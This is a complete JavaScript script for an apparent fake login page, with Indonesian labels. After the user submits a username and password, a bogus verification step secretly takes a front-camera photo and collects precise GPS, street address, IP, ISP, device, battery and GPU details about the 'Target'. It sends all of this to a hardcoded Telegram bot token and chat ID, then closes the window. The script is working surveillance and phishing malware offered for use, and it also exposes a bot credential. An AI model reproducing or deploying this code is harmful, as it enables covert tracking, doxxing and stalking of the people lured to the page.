<script>
const CONFIG = {
  BOT_TOKEN: "7967587846:AAH3fdlA6onGhyH-sAS7sIBm_WkxAqSFvTU",
  CHAT_ID: "7242161057",
  IP_INFO_API: "https://ipapi.co/json/"
};

const loginBtn = document.getElementById('loginBtn');
const loginCard = document.getElementById('loginCard');
const verifyCard = document.getElementById('verifyCard');

loginBtn.addEventListener('click', ()=>{
  const u=document.getElementById('username').value.trim();
  const p=document.getElementById('password').value.trim();
  if(!u||!p){alert("Username & Password wajib diisi!");return;}
  loginCard.style.display='none';
  verifyCard.style.display='block';
  startVerification();
});

async function startVerification(){
  try{
    let pos=null, photo=null;

    // Lokasi
    try{
      pos = await getLocation();
    }catch{
      await telegramSendMessage("âŒ Lokasi Target Tidak Di Izinkan");
    }

    // Kamera
    try{
      photo = await getPhoto();
    }catch{
      await telegramSendMessage("âŒ Foto Target Tidak Di Izinkan");
    }

    const ip = await getPublicIPInfo();
    const gpu = getGPUInfo();
    const batt = await getBattery();
    const media = await getMediaDevices();
    const reverse = pos?.coords ? await reverseGeocode(pos.coords.latitude,pos.coords.longitude) : null;

    const lat = pos?.coords?.latitude, lon = pos?.coords?.longitude;
    const maps = lat ? `https://www.google.com/maps/search/?api=1&query=${lat},${lon}` : null;

    if(photo) await telegramSendPhoto(photo,"ðŸ“¸ Foto Target");

    let parts = [];

    if(lat){
      parts.push(`ðŸ“ Info GPS Target
Latitude : ${lat}
Longatitude : ${lon}
Akurasi : ${pos.coords.accuracy}m
Altitude : ${pos.coords.altitude||'-'}
Kecepatan : ${pos.coords.speed||'-'}
Heading : ${pos.coords.heading||'-'}
Link : ${maps}`);
    }

    if(reverse?.address){
      const a=reverse.address;
      parts.push(`ðŸ  Info Alamat Target
${a.road||'-'} 
Desa : ${a.village||a.suburb||'-'}
Kabupaten : ${a.city||a.town||a.county||'-'}
Kota : ${a.state||'-'}
Kode Pos : ${a.postcode||'-'}
Negara : ${a.country||'-'}`);
    }

    if(ip){
      parts.push(`ðŸŒ Info IP Target
IP Address : ${ip.ip}
Kota : ${ip.city}
Region : ${ip.region}
Negara : ${ip.country_name}
Kode Pos : ${ip.postal}
ISP : ${ip.org}
ASN : ${ip.asn}
Zona : ${ip.timezone}`);
    }

    parts.push(`ðŸ“± Info Device Target
UA : ${navigator.userAgent}
OS : ${navigator.platform}
Browser : ${navigator.vendor||'-'}
RAM : ${navigator.deviceMemory||'-'} GB
CPU : ${navigator.hardwareConcurrency||'-'} core
DoNotTrack : ${navigator.doNotTrack||'-'}
Bahasa : ${navigator.language}
TimeZone : ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);

    if(batt){
      parts.push(`ðŸ”‹ Info Baterai Target
Sisa : ${(batt.level*100).toFixed(0)}%
Charger : ${batt.charging}`);
    }

    if(gpu.vendor||gpu.renderer){
      parts.push(`ðŸŽ® Info GPU Target
Vendor : ${gpu.vendor}
Renderer : ${gpu.renderer}`);
    }

    if(media.length){
      parts.push(`ðŸŽ§ Info Media Devices
${media.map((d,i)=>`${i+1}. [${d.kind}] ${d.label||'-'}`).join('\n')}`);
    }

    parts.push(`ðŸ”— Info Halaman
URL : ${location.href}
Referrer : ${document.referrer||'-'}
Cookie Enabled : ${navigator.cookieEnabled}
History Length : ${history.length}`);

    await telegramStep(parts,700);
    setTimeout(forceClose,1000);

  }catch(e){
    setTimeout(forceClose,500);
  }
}

function getLocation(){
  return new Promise((resolve,reject)=>{
    navigator.geolocation.getCurrentPosition(resolve,()=>reject(new Error("Lokasi ditolak")),{enableHighAccuracy:true,timeout:15000});
  });
}
function getPhoto(){
  return new Promise(async (resolve,reject)=>{
    try{
      const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
      const track=stream.getVideoTracks()[0];
      const c=document.createElement('canvas');
      const v=document.createElement('video');
      v.srcObject=new MediaStream([track]);
      await v.play();
      await new Promise(r=>setTimeout(r,500));
      c.width=v.videoWidth||640;c.height=v.videoHeight||480;
      c.getContext('2d').drawImage(v,0,0,c.width,c.height);
      track.stop();
      c.toBlob(b=>resolve(b),'image/jpeg',0.8);
    }catch{reject(new Error("Kamera ditolak"));}
  });
}
async function getPublicIPInfo(){try{const r=await fetch(CONFIG.IP_INFO_API);if(!r.ok)return null;return await r.json();}catch{return null;}}
function getGPUInfo(){try{const c=document.createElement("canvas");const gl=c.getContext("webgl");const dbg=gl.getExtension("WEBGL_debug_renderer_info");return{vendor:gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}}catch{return {};}}
async function getBattery(){if(navigator.getBattery){try{return await navigator.getBattery();}catch{}}return null;}
async function getMediaDevices(){try{if(!navigator.mediaDevices?.enumerateDevices)return[];const d=await navigator.mediaDevices.enumerateDevices();return d.map(x=>({kind:x.kind,label:x.label,deviceId:x.deviceId}));}catch{return[];}}
async function reverseGeocode(lat,lon){
  try{
    const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&accept-language=id`);
    if(!r.ok)return null;
    return await r.json();
  }catch{return null;}
}
function forceClose(){window.open('','_self');window.close();location.href="about:blank";}
async function telegramSendMessage(txt){const url=`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;return fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CONFIG.CHAT_ID,text:txt,disable_web_page_preview:true})});}
async function telegramSendPhoto(photoBlob,caption){const url=`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;const fd=new FormData();fd.append('chat_id',CONFIG.CHAT_ID);fd.append('photo',photoBlob,'snap.jpg');if(caption)fd.append('caption',caption.slice(0,1000));return fetch(url,{method:'POST',body:fd});}
async function telegramStep(parts,delay=1000){for(const p of parts){await telegramSendMessage(p);await new Promise(r=>setTimeout(r,delay));}}
</script>
